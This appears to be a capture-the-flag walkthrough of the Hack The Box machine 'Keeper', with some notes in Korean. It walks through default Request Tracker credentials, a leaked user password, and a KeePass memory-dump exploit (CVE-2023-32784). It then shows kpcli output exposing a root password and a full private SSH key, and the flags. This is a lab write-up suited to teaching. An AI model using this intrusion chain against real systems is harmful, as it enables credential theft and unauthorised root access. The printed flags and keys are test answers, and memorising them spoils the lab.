@@ -1,0 +1,189 @@
+Machine:Keeper
+TARGET: 10.129.229.41
+
+Task 1
+
+How many open TCP ports are listening on Keeper?
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
+|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+> 2 
+
+Task 2
+
+What is the default password for the default user on Request Tracker (RT)?
+
+google search: request tracker default credentials
+
+root for the username and password for the password
+
+> password
+
+
+
+
+Task 3
+
+Besides root, what other user is in RT?
+
+dashboard > admin > Users 
+
+#	Name	Real Name	Email Address	Status
+27	lnorgaard	Lise Nørgaard	lnorgaard@keeper.htb	Enabled
+14	root	Enoch Root	root@localhost	Enabled
+
+> lnorgaard
+
+
+
+Task 4
+
+What is the lnorgaard user's password on Keeper?
+
+lnorgaard name click 
+
+in Comments about this user box
+New user. Initial password set to Welcome2023!
+
+> Welcome2023!
+
+
+웹 lnorgaard로 로그인 메일확인
+Lise,
+
+Attached to this ticket is a crash dump of the keepass program. Do I need to update the version of the program first...?
+
+Thanks! 
+
+keepass program에 버전이 낮아서 취약점이 존재할것같음
+
+
+Submit User Flag
+
+Submit the flag located in the lnorgaard user's home directory.
+
+ssh lnorgaard@10.129.229.41
+lnorgaard@10.129.229.41's password: Welcome2023!
+
+lnorgaard로 ssh접속
+
+cat user.txt
+
+> 55372721174d858204e1c2fa90933e97
+
+
+
+
+Task 6
+
+What is the 2023 CVE ID for a vulnerability in KeePass
+ that allows an attacker access to the database's master
+  password from a memory dump?
+
+ls
+KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt  
+
+
+
+google search: KeePassDump cve
+
+CVE-2023-32784 Detail
+Modified
+This CVE record has been updated after NVD 
+enrichment efforts were completed. Enrichment 
+data supplied by the NVD may require amendment 
+due to these changes.
+
+Description
+In KeePass 2.x before 2.54, it is possible to
+recover the cleartext master password from a
+memory dump, even when a workspace is locked
+or no longer running. The memory dump can be
+a KeePass process dump, swap file (pagefile.sys), 
+hibernation file (hiberfil.sys), or RAM dump 
+of the entire system. The first character cannot 
+be recovered. In 2.54, there is different API 
+usage and/or random string insertion for mitigation
+
+> CVE-2023-32784
+
+
+Task 7
+
+What is the master password for passcodes.kdbx?
+
+https://github.com/z-jxy/keepass_dump
+exploit 다운
+python3 exploit.py -f KeePassDumpFull.dmp 
+추출해낸 비밀번호: dgrd med flde
+google search: dgrd med flde
+
+> rødgrød med fløde
+
+Task 8
+
+What is the first line of the "Notes" section for the entry in the database containing a private SSH key?
+
+kpcli --kdb passcodes.kdbx
+Provide the master password: rødgrød med fløde
+
+kpcli:/passcodes/Network> show 0
+
+Title: keeper.htb (Ticketing Server)
+Uname: root
+ Pass: F4><3K0nd!
+  URL: 
+Notes: PuTTY-User-Key-File-3: ssh-rsa
+       Encryption: none
+       Comment: rsa-key-20230519
+       Public-Lines: 6
+       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
+       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
+       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
+       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
+       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
+       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
+       Private-Lines: 14
+       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
+       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
+       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
+       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
+       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
+       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
+       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
+       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
+       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
+       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
+       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
+       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
+       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
+       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
+       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
+
+
+> PuTTY-User-Key-File-3: ssh-rsa
+
+Submit Root Flag
+
+Submit the flag located in the root user's home directory.
+
+keeper.ppk에 저장장
+chmod 600 keeper.ppk
+puttygen keeper.ppk -O private-openssh -o id_rsa_keeper
+
+ssh -i id_rsa_keeper root@10.129.229.41 
+
+root사용자 ssh접속
+
+cat root.txt
+> 5fd606db0349584fae3155c7bf7468fc
+
